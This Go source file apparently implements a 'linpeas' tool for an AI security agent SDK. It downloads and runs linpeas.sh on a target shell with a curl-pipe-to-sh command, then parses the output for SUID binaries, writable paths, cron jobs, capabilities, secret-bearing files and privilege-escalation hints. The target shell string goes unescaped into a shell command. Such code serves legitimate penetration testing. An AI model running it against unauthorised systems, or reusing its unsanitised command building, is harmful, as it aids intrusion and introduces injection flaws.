package main

import (
	"context"
	"fmt"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"github.com/zero-day-ai/sdk/types"
)

const (
	ToolName        = "linpeas"
	ToolVersion     = "1.0.0"
	ToolDescription = "Linux privilege escalation enumeration tool - executes linpeas.sh on target systems to identify privilege escalation vectors"
	LinPEASURL      = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
)

// ToolImpl implements the linpeas tool.
type ToolImpl struct{}

// Execute runs linpeas on the target system via the provided shell interface.
// It parses the output to extract privilege escalation findings.
func (t *ToolImpl) Execute(ctx context.Context, input map[string]any) (map[string]any, error) {
	startTime := time.Now()

	// Extract input parameters
	targetShell, ok := input["target_shell"].(string)
	if !ok || targetShell == "" {
		return nil, fmt.Errorf("target_shell is required and must be a non-empty string")
	}

	intensity := "normal"
	if v, ok := input["intensity"].(string); ok && v != "" {
		intensity = v
	}

	// Build linpeas arguments based on intensity
	linpeasArgs := ""
	switch intensity {
	case "quick":
		linpeasArgs = "-s" // Super fast mode
	case "thorough":
		linpeasArgs = "-a" // All checks
	case "normal":
		// Default - no special flags
	}

	// Build the command to execute linpeas on the target
	// Download and execute linpeas in one command
	command := fmt.Sprintf("%s 'curl -sL %s | sh %s'", targetShell, LinPEASURL, linpeasArgs)

	// Execute the command
	cmd := exec.CommandContext(ctx, "sh", "-c", command)
	output, err := cmd.CombinedOutput()
	if err != nil {
		// LinPEAS may return non-zero exit code even on success, so we log but continue
		// Only fail if we have no output at all
		if len(output) == 0 {
			return nil, fmt.Errorf("linpeas execution failed: %w", err)
		}
	}

	// Parse the output
	result := parseLinPEASOutput(string(output))
	result["scan_time_ms"] = time.Since(startTime).Milliseconds()

	return result, nil
}

// Health checks if the tool can execute shell commands.
func (t *ToolImpl) Health(ctx context.Context) types.HealthStatus {
	// Check if we can execute basic shell commands
	cmd := exec.CommandContext(ctx, "sh", "-c", "echo test")
	if err := cmd.Run(); err != nil {
		return types.NewUnhealthyStatus("shell execution not available", map[string]any{
			"error": err.Error(),
		})
	}

	// Check if curl is available (needed to download linpeas)
	cmd = exec.CommandContext(ctx, "which", "curl")
	if err := cmd.Run(); err != nil {
		return types.NewDegradedStatus("curl not found - linpeas download may fail", map[string]any{
			"suggestion": "install curl to enable linpeas downloads",
		})
	}

	return types.NewHealthyStatus("shell and curl available")
}

// parseLinPEASOutput parses the colored/formatted output from linpeas.
// This is a simplified parser that extracts key findings using regex patterns.
func parseLinPEASOutput(output string) map[string]any {
	result := map[string]any{
		"system_info":       extractSystemInfo(output),
		"users":             []map[string]any{},
		"suid_binaries":     extractSUIDBinaries(output),
		"writable_paths":    extractWritablePaths(output),
		"cron_jobs":         extractCronJobs(output),
		"capabilities":      extractCapabilities(output),
		"interesting_files": extractInterestingFiles(output),
		"possible_exploits": extractPossibleExploits(output),
	}

	return result
}

// extractSystemInfo extracts basic system information.
func extractSystemInfo(output string) map[string]any {
	info := map[string]any{
		"hostname":     extractField(output, `Hostname:\s*(.+)`),
		"kernel":       extractField(output, `Kernel:\s*(.+)`),
		"distribution": extractField(output, `Distro:\s*(.+)`),
		"arch":         extractField(output, `Architecture:\s*(.+)`),
	}

	// Clean up empty values
	for k, v := range info {
		if v == "" {
			delete(info, k)
		}
	}

	return info
}

// extractSUIDBinaries finds SUID binaries in the output.
func extractSUIDBinaries(output string) []string {
	var binaries []string
	seen := make(map[string]bool)

	// Look for SUID section and extract file paths
	re := regexp.MustCompile(`(?m)^[-rwxs]+\s+\d+\s+\w+\s+\w+\s+\d+.*?(/[^\s]+)`)
	matches := re.FindAllStringSubmatch(output, -1)

	for _, match := range matches {
		if len(match) > 1 {
			path := strings.TrimSpace(match[1])
			if !seen[path] && strings.Contains(match[0], "s") {
				binaries = append(binaries, path)
				seen[path] = true
			}
		}
	}

	return binaries
}

// extractWritablePaths finds writable directories and files.
func extractWritablePaths(output string) []string {
	var paths []string
	seen := make(map[string]bool)

	// Look for writable paths
	re := regexp.MustCompile(`(?i)writable.*?(/[^\s\)]+)`)
	matches := re.FindAllStringSubmatch(output, -1)

	for _, match := range matches {
		if len(match) > 1 {
			path := strings.TrimSpace(match[1])
			if !seen[path] {
				paths = append(paths, path)
				seen[path] = true
			}
		}
	}

	return paths
}

// extractCronJobs finds potentially exploitable cron jobs.
func extractCronJobs(output string) []map[string]any {
	var jobs []map[string]any
	seen := make(map[string]bool)

	// Look for cron job entries
	re := regexp.MustCompile(`(?m)^[*\d\s/,-]+\s+([^\s]+)\s+(.+)`)
	matches := re.FindAllStringSubmatch(output, -1)

	for _, match := range matches {
		if len(match) > 2 {
			user := strings.TrimSpace(match[1])
			command := strings.TrimSpace(match[2])
			key := user + ":" + command

			if !seen[key] {
				jobs = append(jobs, map[string]any{
					"user":    user,
					"command": command,
					"path":    "",
				})
				seen[key] = true
			}
		}
	}

	return jobs
}

// extractCapabilities finds files with interesting capabilities.
func extractCapabilities(output string) []map[string]any {
	var caps []map[string]any
	seen := make(map[string]bool)

	// Look for capability entries
	re := regexp.MustCompile(`(/[^\s]+)\s+=\s+(.+?)\s+cap`)
	matches := re.FindAllStringSubmatch(output, -1)

	for _, match := range matches {
		if len(match) > 2 {
			file := strings.TrimSpace(match[1])
			capability := strings.TrimSpace(match[2])
			key := file + ":" + capability

			if !seen[key] {
				caps = append(caps, map[string]any{
					"file":       file,
					"capability": capability,
				})
				seen[key] = true
			}
		}
	}

	return caps
}

// extractInterestingFiles finds files that may contain sensitive information.
func extractInterestingFiles(output string) []string {
	var files []string
	seen := make(map[string]bool)

	// Look for interesting file patterns
	patterns := []string{
		`\.pub$`,          // SSH public keys
		`\.pem$`,          // Certificates
		`password`,        // Password files
		`secret`,          // Secret files
		`\.env$`,          // Environment files
		`config\.php$`,    // PHP config
		`web\.config$`,    // IIS config
		`\.git/config$`,   // Git config
	}

	for _, pattern := range patterns {
		re := regexp.MustCompile(fmt.Sprintf(`(/[^\s]*%s)`, pattern))
		matches := re.FindAllStringSubmatch(output, -1)

		for _, match := range matches {
			if len(match) > 1 {
				file := strings.TrimSpace(match[1])
				if !seen[file] {
					files = append(files, file)
					seen[file] = true
				}
			}
		}
	}

	return files
}

// extractPossibleExploits finds potential privilege escalation vectors.
func extractPossibleExploits(output string) []map[string]any {
	var exploits []map[string]any
	seen := make(map[string]bool)

	// Look for CVE mentions
	cveRe := regexp.MustCompile(`(CVE-\d{4}-\d+)`)
	cveMatches := cveRe.FindAllString(output, -1)

	for _, cve := range cveMatches {
		if !seen[cve] {
			exploits = append(exploits, map[string]any{
				"name":        cve,
				"description": "Potential kernel or system vulnerability",
				"confidence":  "medium",
			})
			seen[cve] = true
		}
	}

	// Look for common exploit indicators
	indicators := map[string]string{
		"sudo version":          "Outdated sudo version may be vulnerable",
		"kernel exploit":        "Kernel exploit may be available",
		"writable /etc/passwd":  "writable passwd file allows privilege escalation",
		"writable /etc/shadow":  "writable shadow file allows privilege escalation",
		"docker socket":         "Docker socket access may allow container breakout",
	}

	lowerOutput := strings.ToLower(output)
	for indicator, desc := range indicators {
		if strings.Contains(lowerOutput, indicator) && !seen[indicator] {
			exploits = append(exploits, map[string]any{
				"name":        indicator,
				"description": desc,
				"confidence":  "high",
			})
			seen[indicator] = true
		}
	}

	return exploits
}

// extractField is a helper to extract a single field using regex.
func extractField(output, pattern string) string {
	re := regexp.MustCompile(pattern)
	matches := re.FindStringSubmatch(output)
	if len(matches) > 1 {
		return strings.TrimSpace(matches[1])
	}
	return ""
}
